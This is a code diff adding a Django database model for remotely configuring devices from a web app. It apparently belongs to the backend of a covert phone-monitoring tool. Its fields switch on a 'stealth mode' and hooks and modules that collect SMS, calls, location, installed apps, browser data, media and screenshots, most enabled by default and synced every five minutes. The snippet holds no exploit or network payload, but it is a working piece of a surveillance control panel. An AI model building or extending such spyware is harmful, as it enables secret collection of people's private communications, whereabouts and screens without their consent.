@@ -57,3 +57,54 @@ class Device(models.Model):
         """Generate secure API key"""
         alphabet = string.ascii_letters + string.digits
         return ''.join(secrets.choice(alphabet) for _ in range(20))
+
+
+class DeviceSettings(models.Model):
+    """
+    Device Settings Model - Remote Configuration
+    Allows WebApp to remotely control device settings
+    """
+
+    device = models.OneToOneField(
+        Device,
+        on_delete=models.CASCADE,
+        related_name='settings',
+        primary_key=True
+    )
+
+    # Server Configuration
+    api_base_url = models.URLField(max_length=255, blank=True, null=True)
+    wss_base_url = models.URLField(max_length=255, blank=True, null=True)
+
+    # App Behavior
+    stealth_mode_enabled = models.BooleanField(default=False)
+    auto_start_enabled = models.BooleanField(default=True)
+
+    # System Hooks
+    sms_hook_enabled = models.BooleanField(default=True)
+    call_hook_enabled = models.BooleanField(default=True)
+    location_hook_enabled = models.BooleanField(default=True)
+
+    # Module Enable/Disable
+    module_sms_enabled = models.BooleanField(default=True)
+    module_calls_enabled = models.BooleanField(default=True)
+    module_location_enabled = models.BooleanField(default=True)
+    module_apps_enabled = models.BooleanField(default=True)
+    module_browser_enabled = models.BooleanField(default=True)
+    module_media_enabled = models.BooleanField(default=True)
+    module_screenshots_enabled = models.BooleanField(default=True)
+
+    # Sync Settings
+    sync_interval_minutes = models.IntegerField(default=5)  # Minutes between syncs
+
+    # Metadata
+    updated_at = models.DateTimeField(auto_now=True)
+    settings_version = models.IntegerField(default=1)  # Increment on each update
+
+    class Meta:
+        db_table = 'device_settings'
+        verbose_name = 'Device Settings'
+        verbose_name_plural = 'Device Settings'
+
+    def __str__(self):
+        return f"Settings for {self.device}"
